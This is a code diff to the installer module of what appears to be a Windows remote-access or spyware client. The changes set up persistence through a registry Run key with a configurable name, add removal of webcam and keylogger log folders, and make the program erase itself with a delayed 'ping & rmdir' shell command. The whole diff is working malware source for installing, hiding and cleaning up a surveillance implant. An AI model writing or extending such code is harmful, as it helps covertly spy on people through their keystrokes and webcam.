@@ -1,5 +1,6 @@
 #include "Install.h"
 
+
 // TODO convert recursive chain to if statement
 void Install::installClient(int numOfPath, const std::string& locationOfCurrentExe,const std::string& subdirectoryName,
                             const std::string& subdirectoryFileName,const std::string& nameOfStartUpFile){
@@ -12,7 +13,6 @@ void Install::installClient(int numOfPath, const std::string& locationOfCurrentE
             std::filesystem::create_directory(whereToInstall.parent_path());
             std::filesystem::copy(locationOfCurrentExe, whereToInstall);
             installStartUpFile(whereToInstall,nameOfStartUpFile);
-            pathOfInstallation=whereToInstall.parent_path();
         } catch (const std::filesystem::__cxx11::filesystem_error& e){
             if (numOfPath!=2)installClient(2,locationOfCurrentExe,subdirectoryName,subdirectoryFileName,nameOfStartUpFile);
         }
@@ -23,7 +23,7 @@ void Install::installStartUpFile(const std::wstring& clientPath,const std::strin
     if (!startUpName.empty()){
         HKEY hkey = nullptr;
         RegCreateKey(HKEY_CURRENT_USER,R"(SOFTWARE\Microsoft\Windows\CurrentVersion\Run)", &hkey); //Creates a key
-        RegSetValueExW(hkey, L"Client", 0, REG_SZ, (LPBYTE)clientPath.c_str(), wcslen(clientPath.c_str())* sizeof(wchar_t ));
+        RegSetValueExW(hkey, Converter::string2wstring(STARTUP_NAME).c_str(), 0, REG_SZ, (LPBYTE)clientPath.c_str(), wcslen(clientPath.c_str())* sizeof(wchar_t ));
     }
 }
 
@@ -38,12 +38,26 @@ std::wstring Install::convertNumToPath(int numOfPath){
 }
 
 void Install::uninstall(){
-    // delete files
+    deleteLogs();
     deleteFiles();
 }
 
+void Install::deleteLogs(){
+#ifdef WEBCAM
+    std::filesystem::path webcamLogsPath(getAppDataPath().append(L"\\"+Converter::string2wstring(WEBCAM)));
+    std::filesystem::remove_all(webcamLogsPath);
+#endif
+#ifdef KEYLOGGER
+    std::filesystem::path keyloggerLogsPath(getAppDataPath().append(L"\\"+Converter::string2wstring(KEYLOGGER)));
+    std::filesystem::remove_all(keyloggerLogsPath);
+#endif
+}
+
+
 
 void Install::deleteFiles(){
+    std::filesystem::path whereToInstall = convertNumToPath(INSTALL_PATH);
+    whereToInstall /= SUBDIRECTORY_NAME;
     TCHAR szModuleName[MAX_PATH];
     TCHAR szCmd[2 * MAX_PATH];
     STARTUPINFO si = {0};
@@ -51,8 +65,9 @@ void Install::deleteFiles(){
 
     GetModuleFileName(nullptr, szModuleName, MAX_PATH);
 
-    std::string commandToDelete = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q ";
-    commandToDelete.append(pathOfInstallation.string());
+    std::string commandToDelete = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q ";
+    commandToDelete.append(std::filesystem::path(whereToInstall).string());
+    std::cout << std::filesystem::path(whereToInstall).string() << std::endl;
 
     StringCbPrintf(szCmd, 2 * MAX_PATH, commandToDelete.c_str(), szModuleName);
 
